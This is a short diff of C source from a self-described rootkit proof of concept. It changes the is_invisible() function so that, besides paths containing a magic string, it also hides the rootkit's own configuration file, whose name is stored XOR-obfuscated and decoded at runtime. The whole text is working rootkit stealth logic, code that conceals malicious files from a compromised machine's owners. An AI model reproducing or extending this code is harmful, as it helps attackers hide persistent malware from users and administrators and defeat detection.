@@ -48,12 +48,19 @@ void cleanup(void *var, int len) {
 int is_invisible(const char *path) {
     DEBUG("[rootkit-poc]: is_invisible called\n");
 
+    char *config_file = strdup(CONFIG_FILE);
+
     init(); // hook configurations
 
+    xor(config_file);
+
     // Checks if the path contains the MAGIC_STRING
-    if (strstr(path, MAGIC_STRING)) {
+    if (strstr(path, MAGIC_STRING) || strstr(path, config_file)) {
+        cleanup(config_file, strlen(config_file));
         return 1; // invisible
     }
+
+    cleanup(config_file, strlen(config_file));
 
     return 0; // visible
 }
